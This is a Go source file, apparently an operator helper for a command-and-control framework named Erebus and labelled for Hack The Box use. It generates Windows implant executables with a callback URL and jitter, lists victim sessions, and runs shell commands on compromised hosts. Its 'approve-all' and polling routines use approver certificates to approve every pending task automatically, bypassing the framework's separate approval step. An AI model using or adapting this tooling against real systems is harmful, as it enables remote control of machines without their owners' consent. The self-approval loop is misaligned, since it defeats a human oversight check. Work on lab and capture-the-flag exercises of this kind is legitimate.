//go:build ignore

// HTB operator helper: sessions, shell, approve-loop, listeners, generate, smb/ldap/lateral via shell-style
package main

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/protobuf/proto"
)

func main() {
	server := flag.String("server", "127.0.0.1:50051", "")
	opCert := flag.String("op-cert", os.ExpandEnv("$HOME/.erebus/certs/operator.pem"), "")
	opKey := flag.String("op-key", os.ExpandEnv("$HOME/.erebus/certs/operator-key.pem"), "")
	apCert := flag.String("ap-cert", os.ExpandEnv("$HOME/.erebus/certs/approver.pem"), "")
	apKey := flag.String("ap-key", os.ExpandEnv("$HOME/.erebus/certs/approver-key.pem"), "")
	ca := flag.String("ca", os.ExpandEnv("$HOME/.erebus/certs/ca.pem"), "")
	cmd := flag.String("cmd", "sessions", "sessions|shell|listeners|pending|approve-all|generate|task")
	session := flag.String("session", "", "")
	shell := flag.String("shell", "whoami", "")
	// generate
	out := flag.String("out", "", "implant output path")
	osName := flag.String("os", "windows", "")
	arch := flag.String("arch", "amd64", "")
	callback := flag.String("callback", "", "")
	sleepMs := flag.Int("sleep", 500, "")
	jitter := flag.Int("jitter", 10, "")
	// task raw
	taskType := flag.String("task-type", "", "e.g. shell,module")
	taskJSON := flag.String("task-json", "", "json payload for task")
	flag.Parse()

	op := mustDial(*server, *opCert, *opKey, *ca)
	defer op.Close()
	opC := pb.NewErebusC2Client(op)

	ctx, cancel := context.WithTimeout(context.Background(), 180*time.Second)
	defer cancel()

	switch *cmd {
	case "sessions":
		resp, err := opC.ListSessions(ctx, &pb.ListSessionsRequest{})
		must(err)
		for _, s := range resp.Sessions {
			fmt.Printf("session=%s implant=%s host=%s user=%s os=%s alive=%v last=%d\n",
				s.SessionId, s.ImplantId, s.Hostname, s.Username, s.Os, s.Alive, s.LastCheckin)
		}
	case "listeners":
		resp, err := opC.ListListeners(ctx, &pb.ListListenersRequest{})
		must(err)
		b, _ := json.MarshalIndent(resp, "", "  ")
		fmt.Println(string(b))
	case "pending":
		resp, err := opC.ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
		must(err)
		for _, p := range resp.Approvals {
			fmt.Printf("id=%s type=%v risk=%s session=%s by=%s\n", p.Id, p.TaskType, p.RiskLevel, p.SessionId, p.RequestedBy)
		}
	case "approve-all":
		ap := mustDial(*server, *apCert, *apKey, *ca)
		defer ap.Close()
		apC := pb.NewErebusC2Client(ap)
		resp, err := opC.ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
		must(err)
		for _, p := range resp.Approvals {
			_, err := apC.Approve(ctx, &pb.ApproveRequest{ApprovalId: p.Id})
			if err != nil {
				fmt.Printf("approve %s failed: %v\n", p.Id, err)
			} else {
				fmt.Printf("approved %s\n", p.Id)
			}
		}
	case "shell":
		sid := *session
		if sid == "" {
			resp, err := opC.ListSessions(ctx, &pb.ListSessionsRequest{})
			must(err)
			for _, s := range resp.Sessions {
				if s.Alive {
					sid = s.SessionId
					break
				}
			}
			if sid == "" {
				fatal(fmt.Errorf("no alive session"))
			}
			fmt.Println("using session", sid)
		}
		data, _ := proto.Marshal(&pb.ShellTask{Command: *shell})
		runTaskWithApprove(ctx, opC, *server, *apCert, *apKey, *ca, sid, pb.TaskType_TASK_SHELL, data)
	case "generate":
		req := &pb.GenerateImplantRequest{
			Os:          *osName,
			Arch:        *arch,
			Format:      "exe",
			CallbackUrl: *callback,
			SleepMs:     int32(*sleepMs),
			JitterPct:   int32(*jitter),
		}
		resp, err := opC.GenerateImplant(ctx, req)
		must(err)
		path := *out
		if path == "" {
			path = "build/implant_htb.exe"
		}
		must(os.WriteFile(path, resp.Binary, 0o755))
		fmt.Printf("wrote %s (%d bytes) implant_id=%s secret=%s\n", path, len(resp.Binary), resp.ImplantId, resp.SecretHex)
		if resp.SecretHex != "" {
			_, err := opC.RegisterImplantSecret(ctx, &pb.RegisterImplantSecretRequest{
				ImplantId: resp.ImplantId,
				SecretHex: resp.SecretHex,
			})
			if err != nil {
				fmt.Printf("register-secret warn: %v\n", err)
			} else {
				fmt.Println("registered implant secret")
			}
		}
	default:
		fatal(fmt.Errorf("unknown cmd %s", *cmd))
	}
}

func runTaskWithApprove(ctx context.Context, opC pb.ErebusC2Client, server, apCert, apKey, ca, session string, tt pb.TaskType, data []byte) {
	type result struct {
		resp *pb.ExecuteTaskResponse
		err  error
	}
	done := make(chan result, 1)
	go func() {
		r, err := opC.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
			SessionId: session,
			TaskType:  tt,
			TaskData:  data,
			Wait:      true,
		})
		done <- result{r, err}
	}()

	// poll approvals
	deadline := time.Now().Add(30 * time.Second)
	for time.Now().Before(deadline) {
		select {
		case res := <-done:
			must(res.err)
			printTaskResult(res.resp)
			return
		case <-time.After(300 * time.Millisecond):
			ap := mustDial(server, apCert, apKey, ca)
			apC := pb.NewErebusC2Client(ap)
			pend, err := opC.ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
			if err == nil {
				for _, p := range pend.Approvals {
					if p.SessionId == session {
						if _, err := apC.Approve(ctx, &pb.ApproveRequest{ApprovalId: p.Id}); err != nil {
							fmt.Printf("approve failed: %v\n", err)
						} else {
							fmt.Printf("auto-approved %s\n", p.Id)
						}
					}
				}
			}
			ap.Close()
		}
	}
	res := <-done
	must(res.err)
	printTaskResult(res.resp)
}

func printTaskResult(resp *pb.ExecuteTaskResponse) {
	if resp == nil {
		fmt.Println("nil response")
		return
	}
	fmt.Printf("task_id=%s status=%v\n", resp.TaskId, resp.Status)
	if resp.Result != nil {
		if resp.Result.Error != "" {
			fmt.Printf("error: %s\n", resp.Result.Error)
		}
		if len(resp.Result.Stdout) > 0 {
			fmt.Print(string(resp.Result.Stdout))
		}
		if len(resp.Result.Data) > 0 && len(resp.Result.Stdout) == 0 {
			// try shell result
			var sr pb.ShellResult
			if err := proto.Unmarshal(resp.Result.Data, &sr); err == nil {
				fmt.Print(sr.Stdout)
				if sr.Stderr != "" {
					fmt.Fprint(os.Stderr, sr.Stderr)
				}
				return
			}
			fmt.Printf("data(%d bytes)\n", len(resp.Result.Data))
		}
	}
}

func mustDial(server, cert, key, caPath string) *grpc.ClientConn {
	certPEM, err := os.ReadFile(cert)
	must(err)
	keyPEM, err := os.ReadFile(key)
	must(err)
	caPEM, err := os.ReadFile(caPath)
	must(err)
	tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
	must(err)
	pool := x509.NewCertPool()
	if !pool.AppendCertsFromPEM(caPEM) {
		fatal(fmt.Errorf("bad ca"))
	}
	creds := credentials.NewTLS(&tls.Config{
		Certificates: []tls.Certificate{tlsCert},
		RootCAs:      pool,
		ServerName:   "localhost",
	})
	conn, err := grpc.Dial(server, grpc.WithTransportCredentials(creds))
	must(err)
	return conn
}

func must(err error) {
	if err != nil {
		fatal(err)
	}
}

func fatal(err error) {
	fmt.Fprintln(os.Stderr, err)
	os.Exit(1)
}

// silence unused
var _ = strings.TrimSpace
